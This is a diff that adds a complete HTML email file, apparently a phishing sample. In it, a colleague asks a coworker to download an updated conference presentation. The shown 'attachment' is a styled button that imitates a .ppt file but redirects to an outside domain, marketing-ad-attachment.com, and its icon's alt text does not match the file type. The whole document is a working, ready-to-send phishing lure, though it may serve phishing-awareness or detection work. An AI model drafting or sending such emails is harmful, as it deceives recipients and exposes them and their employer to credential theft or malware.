@@ -1,0 +1,84 @@
+MIME-Version: 1.0
+Subject: Updated presentation for conference
+From: Nate Flint <nflint@mkitchen.com>
+To: Billie Jones <bjones@mkitchen.com>
+Content-Type: text/html; charset=utf-8
+
+<html>
+<style>
+      body {
+            font-family: "Segoe UI", Arial, sans-serif;
+      }
+      
+      .attachment-container {
+        display: inline-flex;
+        align-items: center;
+    }
+ 
+    a.button {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        background-color: #e5e5e5;
+        color: #e5e5e5;
+        font-weight: bold;
+        font-size: 15px;
+        padding: 9px 10px;
+        border-radius: 4px;
+        border: none;
+        text-decoration: none;
+        box-shadow: 0px 4px 10px 0px rgba(128, 128, 128, 0.5); 
+        cursor: pointer;
+        
+    }
+ 
+    .image-logo {
+        width: 50px;
+        height: 50px;
+    }
+ 
+    .button-text-container {
+        display: flex;
+        flex-direction: column;
+        text-align: left;
+    }
+ 
+    .main-title {
+        color: black;
+    }
+ 
+    .size-subtitle,
+    .subtitle {
+        color: #495057;
+        font-weight: 300;
+    }
+
+</style>
+
+<br> Hi Billie,<br> 
+
+<br> I finalized the changes to our presentation for the conference later this week. I'll have it on my computer, but could you download a copy too? I want to be prepared for any technical difficulties so our presentation can go smoothly. <br> 
+
+<br> Thanks,<br> 
+Nate <br>
+<br>
+<br>
+
+<body>
+
+        <div class = "attachment-container">
+           <a button onclick="window.location.href='https://marketing-ad-attachment.com'";  class ="button">
+                <img src="https://i.imgur.com/zhxZ97k.png" class="image-logo" alt="xlsx icon">
+                <div class="button-text-container">
+                    <span class= "main-title" style="color:black">mkitchen-presentation26.ppt</span>
+                    <span class="size-subtitle">10 MB</span>
+                    <span class="subtitle">Click to view and edit</span>
+                </div>
+            </a>
+        </div>
+    </body>
+    
+</html>
+
+
+
